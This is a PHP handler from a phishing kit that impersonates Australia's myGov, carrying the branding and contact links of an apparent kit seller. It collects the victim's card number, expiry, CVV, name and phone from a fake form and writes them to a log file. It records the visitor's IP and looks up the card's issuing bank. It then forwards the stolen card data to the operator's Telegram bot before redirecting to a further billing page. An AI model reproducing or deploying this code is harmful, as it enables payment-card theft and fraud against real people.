<?php
/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⠆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢤⣴⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣄⠐⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠺⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⠟⢁⣴⣷⣦⣤⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠛⡆⠀⠉⠛⠻⠿⠿⠿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣴⣿⡦⠀⢻⣷⠀⠀⠀t.me/BigDan_T00LS⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣿⣿⡿⠁⠀⠘⠋⠀  wa.me/message/MIEE56RRIQU5C1
⠀⠀⠀⣰⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠀⠀         ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
*/



include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php";


include "../../admin/config.php";
$chatId = trim(file_get_contents("../../admin/config/chatId.ini"));
$botUrl = trim(file_get_contents("../../admin/config/botUrl.ini"));
$telegram = trim(file_get_contents("../../admin/config/status_telegram.ini"));
$discord = trim(file_get_contents("../../admin/config/status_discord.ini"));
$webhookUrl = trim(file_get_contents("../../admin/config/discord.ini"));
extract($_REQUEST);
$file1 = fopen("../../results/logins.txt", "a");
fwrite($file1, $holder .":". $cardnumber .":". $expiry .":". $cvv .":". $phone);
fwrite($file1, "\n");
fclose($file1);

$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";

$file = fopen("Mygov.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");


$file1 = fopen("../../results/logins.txt", "a");


fwrite($file1,"[t.me/BigDan_T00LS][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][t.me/BigDan_T00LS] ". "\n");
fwrite($file1, " ##### ONLINE ACCESSS 🔐 #### ". "\n");
fwrite($file1, "> Card Holder Name: ");
fwrite($file1, $holder. "\n");
fwrite($file1, "> Card Number: ");
fwrite($file1, $cardnumber. "\n");
fwrite($file1, "> Expiry Date: ");
fwrite($file1, $expiry. "\n");
fwrite($file1, "> CVV: ");
fwrite($file1, $cvv. "\n");
fwrite($file1, "> Phone Num: ");
fwrite($file1, $phone. "\n");
fwrite($file1, " ##### ENDS HERE 🔐#### ". "\n");
fwrite($file1,"[t.me/BigDan_T00LS][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][t.me/BigDan_T00LS] ". "\n");

fwrite($file1, "\n");
fclose($file1);

$HOLD = $_POST["holder"];
$CARDN = $_POST["cardnumber"];
$EXP = $_POST["expiry"];
$CV = $_POST["cvv"];
$PH = $_POST["phone"];








$hostname = gethostbyaddr($ip);
$bincheck = $_POST['cardnumber'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$bin = $_POST['cardnumber'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$cardlastdigit = substr($_POST['cardnumber'],12,16);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
$_SESSION['bank_country'] = $xBIN["country"]["name"];



$BN = $_POST["bank_name"];
$BS = $_POST["bank_scheme"];
$BT = $_POST["bank_type"];
$BB = $_POST["bank_brand"];
$BC = $_POST["bank_country"];



$data = "[t.me/BigDan_T00LS][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][t.me/BigDan_T00LS] \n $message 
< C A R D  I N F O >🔐\n > Card Holder Name: $HOLD \n > Card Number: $CARDN \n > Expiry Date: $EXP \n > CVV: $CV \n > Bank Name: $BN \n > Bank Scheme: $BS \n > Bank Type: $BT \n > Bank Brand: $BB \n > Bank Country: $BC \n ";

// Telegram send function
$txt = $data;
if ($telegram == "on"){
    $send = ['chat_id'=>$chatId,'text'=>$txt];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}





HEADER("Location: ../addbilling.php");







?>

